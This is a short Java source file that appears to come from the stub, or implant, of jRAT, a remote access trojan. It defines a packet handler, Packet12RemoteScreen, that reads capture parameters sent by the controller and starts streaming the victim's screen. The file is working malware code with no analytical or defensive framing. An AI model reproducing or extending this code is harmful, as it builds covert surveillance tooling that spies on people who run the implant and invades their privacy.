package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read(Connection con) throws Exception {
		int size = con.readInt();
		int quality = con.readInt();
		int monitor = con.readInt();
		int columns = con.readInt();
		int rows = con.readInt();
		
		new Screen(con, size, quality, monitor, columns, rows).start();
	}

}
